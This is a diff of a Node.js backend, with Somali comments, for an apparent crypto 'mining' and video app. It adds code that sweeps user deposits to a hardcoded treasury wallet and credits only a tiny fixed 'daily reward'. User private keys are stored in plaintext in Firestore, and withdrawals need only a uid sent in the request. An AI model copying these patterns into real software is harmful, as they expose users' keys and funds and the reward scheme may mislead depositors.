@@ -8,13 +8,21 @@ app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
 
-const upload = multer({ 
+const upload = multer({
     storage: multer.memoryStorage(),
-    limits: { fileSize: 50 * 1024 * 1024 } // Ilaa 50MB
+    limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 const provider = new ethers.JsonRpcProvider("https://polygon-bor-rpc.publicnode.com");
 const PROJECT_ID = process.env.FIREBASE_PROJECT_ID || 'somapp-61ebd';
+
+// Cinwaankaaga guud ee Polygon ee deposit-ka lagu shubo & withdraw-ga laga bixiyo
+const TREASURY_WALLET_ADDRESS = "0x66Aa875c850aF5136eEcba5489a674CCA53eAae8";
+const TREASURY_PRIVATE_KEY = process.env.MAIN_WALLET_PRIVATE_KEY || "";
+
+const MIN_DEPOSIT_POL = 0.00001;
+const DAILY_REWARD_POL = 0.000009;
+const MIN_WITHDRAW_POL = 0.00000001;
 
 async function getFirestoreUser(uid) {
     try {
@@ -23,15 +31,17 @@ async function getFirestoreUser(uid) {
         if (!response.ok) return null;
         const data = await response.json();
         if (!data.fields) return null;
-        
+
         return {
             email: data.fields.email?.stringValue || '',
             displayName: data.fields.displayName?.stringValue || '',
             internalUserId: data.fields.internalUserId?.stringValue || '',
             polygonAddress: data.fields.polygonAddress?.stringValue || '',
             privateKey: data.fields.privateKey?.stringValue || '',
-            totalDeposited: parseFloat(data.fields.totalDeposited?.doubleValue || data.fields.totalDeposited?.integerValue || 100.0),
-            withdrawnTotal: parseFloat(data.fields.withdrawnTotal?.doubleValue || data.fields.withdrawnTotal?.integerValue || 0.0),
+            totalDeposited: parseFloat(data.fields.totalDeposited?.doubleValue ?? data.fields.totalDeposited?.integerValue ?? 0),
+            dailyRewardTotal: parseFloat(data.fields.dailyRewardTotal?.doubleValue ?? data.fields.dailyRewardTotal?.integerValue ?? 0),
+            withdrawnTotal: parseFloat(data.fields.withdrawnTotal?.doubleValue ?? data.fields.withdrawnTotal?.integerValue ?? 0),
+            miningActive: Boolean(data.fields.miningActive?.booleanValue || false),
             lastWithdrawDate: data.fields.lastWithdrawDate?.stringValue || ''
         };
     } catch (err) {
@@ -50,8 +60,10 @@ async function saveFirestoreUser(uid, userData) {
                 internalUserId: { stringValue: userData.internalUserId },
                 polygonAddress: { stringValue: userData.polygonAddress },
                 privateKey: { stringValue: userData.privateKey },
-                totalDeposited: { doubleValue: userData.totalDeposited },
-                withdrawnTotal: { doubleValue: userData.withdrawnTotal },
+                totalDeposited: { doubleValue: Number(userData.totalDeposited) },
+                dailyRewardTotal: { doubleValue: Number(userData.dailyRewardTotal) },
+                withdrawnTotal: { doubleValue: Number(userData.withdrawnTotal) },
+                miningActive: { booleanValue: Boolean(userData.miningActive) },
                 lastWithdrawDate: { stringValue: userData.lastWithdrawDate || '' }
             }
         };
@@ -65,6 +77,45 @@ async function saveFirestoreUser(uid, userData) {
     }
 }
 
+// Si toos ah ayuu ugu wareejiyaa 0x66Aa875c850aF5136eEcba5489a674CCA53eAae8 marka deposit >= 0.00001 POL la helo
+async function syncUserDepositAndSweep(uid, userData) {
+    if (!userData.polygonAddress) return userData;
+
+    try {
+        const rawBalWei = await provider.getBalance(userData.polygonAddress);
+        const rawBalPol = parseFloat(ethers.formatEther(rawBalWei));
+
+        if (rawBalPol >= MIN_DEPOSIT_POL) {
+            const feeData = await provider.getFeeData();
+            const gasLimit = 21000n;
+            const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits("30", "gwei");
+            const estimatedGasCostWei = gasLimit * maxFeePerGas;
+            const estimatedGasCostPol = parseFloat(ethers.formatEther(estimatedGasCostWei));
+
+            const sweepablePol = rawBalPol - estimatedGasCostPol;
+
+            if (sweepablePol > 0 && userData.privateKey) {
+                const userWallet = new ethers.Wallet(userData.privateKey, provider);
+                const tx = await userWallet.sendTransaction({
+                    to: TREASURY_WALLET_ADDRESS,
+                    value: ethers.parseEther(sweepablePol.toFixed(8)),
+                    gasLimit
+                });
+                await tx.wait(1);
+            }
+
+            userData.totalDeposited = parseFloat((userData.totalDeposited + rawBalPol).toFixed(8));
+            userData.dailyRewardTotal = parseFloat((userData.dailyRewardTotal + DAILY_REWARD_POL).toFixed(8));
+            userData.miningActive = true;
+            await saveFirestoreUser(uid, userData);
+        }
+    } catch (err) {
+        console.error("Deposit Sync/Sweep Error:", err.message);
+    }
+
+    return userData;
+}
+
 app.post('/api/auth-user', async (req, res) => {
     try {
         const email = req.body.email || "";
@@ -76,107 +127,110 @@ app.post('/api/auth-user', async (req, res) => {
         }
 
         let existingUser = await getFirestoreUser(uid);
-        let polygonAddress = "";
-        let internalUserId = "";
-        let userPrivateKey = "";
-        let totalDeposited = 100.0;
-        let withdrawnTotal = 0.0;
 
         if (!existingUser || !existingUser.polygonAddress) {
             const newWallet = ethers.Wallet.createRandom();
-            internalUserId = "KNN-" + Math.floor(100000 + Math.random() * 900000);
-            polygonAddress = newWallet.address;
-            userPrivateKey = newWallet.privateKey;
+            const internalUserId = "KNN-" + Math.floor(100000 + Math.random() * 900000);
 
-            await saveFirestoreUser(uid, {
+            existingUser = {
                 email: email || `${uid}@knn-micropay.com`,
-                displayName: displayName,
-                internalUserId: internalUserId,
-                polygonAddress: polygonAddress,
-                privateKey: userPrivateKey,
-                totalDeposited: 100.0,
+                displayName,
+                internalUserId,
+                polygonAddress: newWallet.address,
+                privateKey: newWallet.privateKey,
+                totalDeposited: 0.0,
+                dailyRewardTotal: 0.0,
                 withdrawnTotal: 0.0,
+                miningActive: false,
                 lastWithdrawDate: ""
-            });
-        } else {
-            polygonAddress = existingUser.polygonAddress;
-            internalUserId = existingUser.internalUserId || ("KNN-" + Math.floor(100000 + Math.random() * 900000));
-            userPrivateKey = existingUser.privateKey;
-            totalDeposited = existingUser.totalDeposited;
-            withdrawnTotal = existingUser.withdrawnTotal;
+            };
+            await saveFirestoreUser(uid, existingUser);
+        } else if (!existingUser.internalUserId) {
+            existingUser.internalUserId = "KNN-" + Math.floor(100000 + Math.random() * 900000);
+            await saveFirestoreUser(uid, existingUser);
         }
 
-        let currentRemaining = totalDeposited - withdrawnTotal;
-        let dailyLimit = parseFloat((totalDeposited / 300).toFixed(4));
+        existingUser = await syncUserDepositAndSweep(uid, existingUser);
+
+        const currentRemaining = Math.max(0, existingUser.dailyRewardTotal - existingUser.withdrawnTotal);
+        const dailyLimit = existingUser.miningActive ? DAILY_REWARD_POL : 0;
 
         return res.json({
             success: true,
-            userId: internalUserId,
-            polygonAddress: polygonAddress,
-            privateKey: userPrivateKey,
-            balance: currentRemaining.toFixed(2),
-            dailyLimit: dailyLimit
+            userId: existingUser.internalUserId,
+            polygonAddress: existingUser.polygonAddress,
+            miningActive: existingUser.miningActive,
+            balance: currentRemaining.toFixed(8),
+            dailyLimit: dailyLimit.toFixed(6)
         });
-
     } catch (err) {
         console.error("Auth Error:", err.message);
         return res.status(500).json({ success: false, error: "Cilad Server: " + err.message });
     }
 });
 
+// Withdraw: waxaa laga bixiyaa cinwaanka 0x66Aa875c850aF5136eEcba5489a674CCA53eAae8
 app.post('/api/withdraw', async (req, res) => {
     try {
-        const { uid, recipientAddress } = req.body;
+        const { uid, recipientAddress, amount } = req.body;
 
-        if (!uid || !recipientAddress) {
-            return res.status(400).json({ success: false, error: "Fadlan buuxi xogta saxda ah." });
+        if (!uid || !recipientAddress || !ethers.isAddress(recipientAddress)) {
+            return res.status(400).json({ success: false, error: "Fadlan geli UID iyo Polygon address sax ah." });
+        }
+
+        if (!TREASURY_PRIVATE_KEY) {
+            return res.status(500).json({ success: false, error: "MAIN_WALLET_PRIVATE_KEY lama dejin server-ka." });
         }
 
         let userData = await getFirestoreUser(uid);
-        if (!userData || !userData.privateKey) {
+        if (!userData) {
             return res.status(404).json({ success: false, error: "User-ka lama helin." });
         }
 
-        let currentRemaining = userData.totalDeposited - userData.withdrawnTotal;
-        let dailyLimit = parseFloat((userData.totalDeposited / 300).toFixed(4));
+        userData = await syncUserDepositAndSweep(uid, userData);
 
-        if (currentRemaining <= 0) {
-            return res.status(400).json({ success: false, error: "Harraagaaga lacagtu waa ay dhammaatay!" });
+        const currentRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal);
+        const requestedAmount = amount !== undefined && amount !== null && amount !== ""
+            ? parseFloat(amount)
+            : currentRemaining;
+
+        if (isNaN(requestedAmount) || requestedAmount < MIN_WITHDRAW_POL) {
+            return res.status(400).json({ success: false, error: `Xaddiga ugu yar ee la bixi karo waa ${MIN_WITHDRAW_POL} POL.` });
         }
 
-        const todayStr = new Date().toISOString().split('T')[0];
-        if (userData.lastWithdrawDate === todayStr) {
-            return res.status(400).json({ success: false, error: "Horay ayaad u qaadatay saamigaaga maanta! Soo laabo berrito." });
+        if (requestedAmount > currentRemaining) {
+            return res.status(400).json({ success: false, error: "Hadhaagaaga kuma filna qaddarka aad rabto inaad la baxdo." });
         }
 
-        let withdrawAmount = Math.min(dailyLimit, currentRemaining);
+        const treasurySigner = new ethers.Wallet(TREASURY_PRIVATE_KEY, provider);
+        if (treasurySigner.address.toLowerCase() !== TREASURY_WALLET_ADDRESS.toLowerCase()) {
+            return res.status(500).json({ success: false, error: "MAIN_WALLET_PRIVATE_KEY kuma laha cinwaanka withdraw-ga ee la cayimay." });
+        }
 
-        const adminWallet = new ethers.Wallet(userData.privateKey, provider);
-        const tx = await adminWallet.sendTransaction({
+        const tx = await treasurySigner.sendTransaction({
             to: recipientAddress,
-            value: ethers.parseEther(withdrawAmount.toString())
+            value: ethers.parseEther(requestedAmount.toFixed(8))
         });
+        await tx.wait(1);
 
-        userData.withdrawnTotal += withdrawAmount;
-        userData.lastWithdrawDate = todayStr;
+        userData.withdrawnTotal = parseFloat((userData.withdrawnTotal + requestedAmount).toFixed(8));
         await saveFirestoreUser(uid, userData);
 
-        let newRemaining = (userData.totalDeposited - userData.withdrawnTotal).toFixed(2);
+        const newRemaining = Math.max(0, userData.dailyRewardTotal - userData.withdrawnTotal).toFixed(8);
 
         return res.json({
             success: true,
-            message: `Guul! Waxaad la baxaysey saamigii maanta oo ah ${withdrawAmount.toFixed(2)} POL. Harraagaagu wuxuu noqday ${newRemaining} POL.`,
+            message: `Guul! Waxaad la baxday ${requestedAmount.toFixed(8)} POL. Harraagaagu wuxuu noqday ${newRemaining} POL.`,
             txHash: tx.hash,
             newBalance: newRemaining
         });
-
     } catch (err) {
         console.error("Withdraw Error:", err.message);
         return res.status(500).json({ success: false, error: "Cilad Blockchain: " + err.message });
     }
 });
 
-// Video Upload Endpoint (Direct Base64 Data URL to Firestore)
+// Video Upload Endpoint
 app.post('/api/upload-video', upload.single('mediaFile'), async (req, res) => {
     try {
         if (!req.file) {
@@ -206,11 +260,16 @@ app.post('/api/upload-video', upload.single('mediaFile'), async (req, res) => {
             }
         };
 
-        await fetch(firestoreUrl, {
+        const saveRes = await fetch(firestoreUrl, {
             method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
         });
+
+        if (!saveRes.ok) {
+            const errText = await saveRes.text();
+            return res.status(400).json({ success: false, error: "Keydinta Firestore waa fashilantay (faylku wuu weyn yahay): " + errText });
+        }
 
         return res.json({ success: true, message: "Video-ga waa la keydiyay." });
     } catch (err) {
@@ -223,7 +282,7 @@ app.get('/api/get-videos', async (req, res) => {
         const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos`;
         const response = await fetch(firestoreUrl);
         const data = await response.json();
-        
+
         let videos = [];
         if (data.documents) {
             videos = data.documents.map(doc => {
@@ -231,7 +290,7 @@ app.get('/api/get-videos', async (req, res) => {
                 const likes = fields.likes?.arrayValue?.values ? fields.likes.arrayValue.values.map(v => v.stringValue) : [];
                 const subscribers = fields.subscribers?.arrayValue?.values ? fields.subscribers.arrayValue.values.map(v => v.stringValue) : [];
                 const comments = fields.comments?.arrayValue?.values ? fields.comments.arrayValue.values.map(v => JSON.parse(v.stringValue)) : [];
-                
+
                 return {
                     id: fields.videoId?.stringValue || '',
                     uid: fields.uid?.stringValue || '',
@@ -260,7 +319,7 @@ app.post('/api/interact-video', async (req, res) => {
     try {
         const { videoId, action, userId, userName, commentText } = req.body;
         const firestoreUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/videos/${videoId}`;
-        
+
         const getRes = await fetch(firestoreUrl);
         if (!getRes.ok) return res.status(404).json({ success: false, error: "Video lama helin" });
         const docData = await getRes.json();
